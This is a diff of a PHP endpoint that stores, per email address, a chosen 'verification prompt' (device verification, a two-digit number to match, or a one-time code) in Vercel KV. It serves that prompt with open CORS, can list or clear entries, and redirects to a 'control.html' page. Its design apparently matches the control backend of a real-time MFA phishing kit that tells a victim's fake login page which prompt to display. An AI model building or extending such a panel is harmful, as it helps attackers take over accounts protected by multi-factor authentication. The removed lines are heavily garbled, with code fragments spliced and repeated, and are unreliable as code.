@@ -26,117 +26,166 @@ function kvRequest($method, $url, $token, $endpoint, $body = null) {
     }
 
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result<?php
-header("Access-Control-Allow-Origin: *");
-headerURheadO_header("Content-Type: applicatiol_error($c
-$kvUrl = getenv('KV_REST_API_URL');
-$kvrro$kvToken = getenv('KV_REST_API_TOKV $kvKey = 'verify_data';
+    $result = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
+    curl_close($ch);
 
-function kvRe }
-function kvRequest($me'     if (!$url || !$token) {
-        return ['error' => 'Vercel KV nke        return ['error' =>eq    }
-
-    $ch = curl_init();
-    $fullUrl = rtrim($url, '/') . '/' . ltrim($endpoint, '/');
-    curl_setopt($ch, CURLOPT_URL, $fullUrl);
-    cuda
-    json_decode($resp['result    curl_setopt($ch, CURLOPT_URL, $fullUrl);
-    curl_setopt(      curl_setopt($ch, CURLOPT_RETURNTRANSFERif    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $metho      curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        '          'Authorizationunction kvSetData($ur        'Content-Typta) {
-    return kvRequ    ]);
-
-    if ($body !== null) {
-    ncode($key)        curl_setopt($ch,e(    }
-
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result<?p_GET['ema    $result<?php
-header("Access-Contr $idenheader(" trim($_GheaderURheadO_header("Content-Type: appl) $kvUrl = getenv('KV_REST_API_URL');
-$kvrro$kvToken = geco$kvrro$kvToken = geteifier required'
-function kvRe }
-function kvRequest($me'     if (!$url || !$toke$kvfunction kvRe(is        return ['error' =>     http_response_code(50
-    $ch = curl_init();
-    $fullUrl = rtrim($uit;
+    if ($curlError) {
+        return ['error' => 'KV connection error: ' . $curlError];
     }
-    $identifierKey     $fullUrl = rtrim(nt    curl_setopt($ch, CURLOPT_URL, $fullUrl);
-    cuda
-    jso$i    cuda
-    json_decode($resp['resul    $res    jso [    curl_setopt(      curl_setopt($ch, CURLOPT_RETURNTRANSFERif    curl_          '          'Authorizationunction kvSetData($ur        'Content-Typta) {
-    return kvRequ    ]);
 
-    if ($body !== null) {
-    ncode($key)        cti    return kvRequ    ]);
+    return ['httpCode' => $httpCode, 'result' => $result];
+}
 
-    if ($body !== null) {
-    ncode($key)        cur['
-    if ($body !== null       ncode($key)        con
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
- pro    $result<?p_GET['ema    $result<?php
-hf header("Access-Contr $idenheader(" tri) $kvrro$kvToken = geco$kvrro$kvToken = geteifier required'
-function kvRe }
-function kvRequest($me'     if (!$url || !$toptfunction kvRe }
-function kvRequest($me'     if (!$url ||tyfunction kvReq||    $ch = curl_init();
-    $fullUrl = rtrim($uit;
+function kvGetData($url, $token, $key) {
+    $resp = kvRequest('GET', $url, $token, 'get/' . urlencode($key));
+    if (isset($resp['error'])) return $resp;
+    if ($resp['httpCode'] === 200) {
+        $data = json_decode($resp['result'], true);
+        if ($data && isset($data['result'])) {
+            $val = $data['result'];
+            if ($val === null || $val === '') return [];
+            return json_decode($val, true) ?: [];
+        }
     }
-    $identifierKey     $fullUrl = rtrim(nt    curl_setopt($chyp    $fullUrl = rtrim(      }
-    $identifierKey rr    pr    cuda
-    jso$i    cuda
-    json_decode($resp['resul    $res    jso [    curl_seto0)    jso      json_decode(e(    return kvRequ    ]);
+    return [];
+}
 
-    if ($body !== null) {
-    ncode($key)        cti    return kvRequ    ]);
+function kvSetData($url, $token, $key, $data) {
+    return kvRequest('POST', $url, $token, 'set/' . urlencode($key), ['value' => json_encode($data)]);
+}
 
-    if ($body !== null) {
-    ncode($key)        cur['
-    if ($body !== null       ncode($ke$d
-    if ($body !== null }
-    ncode($key)        c(s
-    if ($body !== null) {
-    ncode($key)       [
-     ncode($key)        cid    if ($body !== null     yp    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
- pro)
-    pro    $res$promptType === 'choose_number'hf header("Access-Contr $idenheader(" tri)']function kvRe }
-function kvRequest($me'     if (!$url || !$toptfunction kvRe }
-function kvRequest($' function kvRequifunction kvRequest($me'     if (!$url ||tyfunction kvReq||         $fullUrl = rtrim($uit;
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email']) && !isset($_GET['list'])) {
+    $identifier = trim($_GET['email']);
+    if (empty($identifier)) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Identifier required']);
+        exit;
     }
-    $identifierKey     $fullUrl = rtrim(nt     $    }
-    $identifber > 99)          $identifierKey rr    pr    cuda
-    jso$i    cuda
-    json_decode($resp['resul    $r  ex    jso$i    cuda
-    json_decode(nD    json_decode((i
-    if ($body !== null) {
-    ncode($key)        cti    return kvRequ    ]);
-
-    if ($body !== null) {
-    ny,     ncode($key)        ces
-    if ($body         http_response_code(503);
-        ncode($key)        csp    if ($body !== null     ec    if ($body !== null }
-    ncode($keysa    ncode($key)        om    if ($body !== null) {f ($_SERVER['REQUEST_METHOD'     ncode($key)      $i pro)
-    pro    $res$promptType === 'choose_number'hf header("Access-Contr $idenheader(" tri)']f      tpfunction kvRequest($me'     if (!$url || !$toptfunction kvRe }
-function kvRequest($'       exit;
+    $data = kvGetData($kvUrl, $kvToken, $kvKey);
+    if (isset($data['error'])) {
+        http_response_code(503);
+        echo json_encode($data);
+        exit;
     }
-   function kvRequest($' function kvRequifunction kvRequest($me'da    }
-    $identifierKey     $fullUrl = rtrim(nt     $    }
-    $identifber > 99)          $identifierKey rr    pr    cuda
-   (s    lo    $identifber > 99)          $identifierKey rr    y]    jso$i    cuda
-    json_decode($resp['resul    $r  ex    jSe    json_decode(vT    json_decode(nD    json_decode((i
-  ($resp['error']))    if ($body !== null) {
-    ncode03    ncode($key)        c_e
-    if ($body !== null) {
-    ny,     ncode($key ec    ny,     ncode($key) '     if ($body         http_responon        ncode($key)        csp    if ($body ! j    ncode($keysa    ncode($key)        om    if ($body !== null) {f ($_SERVER['REQ
-     pro    $res$promptType === 'c_METHOD'] === 'GET' && !isset($_GET['email']) && !isset($_GET['list'])) {
+    $identifierKey = md5(strtolower($identifier));
+    if (isset($data[$identifierKey]) && isset($data[$identifierKey]['prompt_type'])) {
+        $response = [
+            'prompt_type' => $data[$identifierKey]['prompt_type'],
+            'timestamp' => $data[$identifierKey]['timestamp']
+        ];
+        if ($data[$identifierKey]['prompt_type'] === 'choose_number' && isset($data[$identifierKey]['number'])) {
+            $response['number'] = $data[$identifierKey]['number'];
+        }
+        echo json_encode($response);
+    } else {
+        echo json_encode(['prompt_type' => null]);
+    }
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $identifier = isset($_POST['identifier']) ? trim($_POST['identifier']) : '';
+    $promptType = isset($_POST['prompt_type']) ? trim($_POST['prompt_type']) : '';
+    if (empty($identifier) || empty($promptType)) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Identifier and prompt_type required']);
+        exit;
+    }
+    if (!in_array($promptType, ['device_verify', 'choose_number', 'otp'])) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid prompt_type']);
+        exit;
+    }
+    $data = kvGetData($kvUrl, $kvToken, $kvKey);
+    if (isset($data['error'])) {
+        http_response_code(503);
+        echo json_encode($data);
+        exit;
+    }
+    $identifierKey = md5(strtolower($identifier));
+    $verificationData = [
+        'identifier' => $identifier,
+        'prompt_type' => $promptType,
+        'timestamp' => time()
+    ];
+    if ($promptType === 'choose_number') {
+        $number = isset($_POST['number']) ? trim($_POST['number']) : '';
+        if ($number === '') {
+            echo json_encode(['error' => 'Number required for choose_number prompt']);
+            exit;
+        }
+        if (!is_numeric($number) || strlen($number) < 1 || strlen($number) > 2 || $number < 0 || $number > 99) {
+            echo json_encode(['error' => 'Must provide a number between 0-99']);
+            exit;
+        }
+        $verificationData['number'] = (int)$number;
+    }
+    $data[$identifierKey] = $verificationData;
+    $resp = kvSetData($kvUrl, $kvToken, $kvKey, $data);
+    if (isset($resp['error'])) {
+        http_response_code(503);
+        echo json_encode($resp);
+        exit;
+    }
+    echo json_encode(['success' => true, 'message' => 'Verification prompt set']);
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
+    $identifier = isset($_GET['email']) ? trim($_GET['email']) : '';
+    if (empty($identifier)) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Identifier required']);
+        exit;
+    }
+    $data = kvGetData($kvUrl, $kvToken, $kvKey);
+    if (isset($data['error'])) {
+        http_response_code(503);
+        echo json_encode($data);
+        exit;
+    }
+    $identifierKey = md5(strtolower($identifier));
+    if (isset($data[$identifierKey])) {
+        unset($data[$identifierKey]);
+        $resp = kvSetData($kvUrl, $kvToken, $kvKey, $data);
+        if (isset($resp['error'])) {
+            http_response_code(503);
+            echo json_encode($resp);
+            exit;
+        }
+        echo json_encode(['success' => true, 'message' => 'Verification prompt cleared']);
+    } else {
+        echo json_encode(['error' => 'No verification prompt found for this identifier']);
+    }
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['email']) && !isset($_GET['list'])) {
     header('Location: control.html');
     exit;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['list']) && $_GET['list'] === 'all') {
-    $data = kvGetData($kvUrl, $kv    }
-   function kvRequest($' fat   frror'])) {
+    $data = kvGetData($kvUrl, $kvToken, $kvKey);
+    if (isset($data['error'])) {
         http_response_code(503);
-        echo json_encode($data    $identifber > 99)          $identifierKey rr      $changed = false;
+        echo json_encode($data);
+        exit;
+    }
+    $currentTime = time();
+    $changed = false;
     foreach ($data as $key => $item) {
-          json_decode($resp $item['timestamp']) > 3600) {
-            unset($data[$key]);  ($resp['error']))    if ($body !== null) {
-    ncode03    ncode($key)        c_e
-    if ($body !en    ncode03    ncode($key)        c_e
-    ie(    if ($body !== }
+        if (($currentTime - $item['timestamp']) > 3600) {
+            unset($data[$key]);
+            $changed = true;
+        }
+    }
+    if ($changed) {
+        kvSetData($kvUrl, $kvToken, $kvKey, $data);
+    }
+    echo json_encode($data);
+    exit;
+}
 ?>
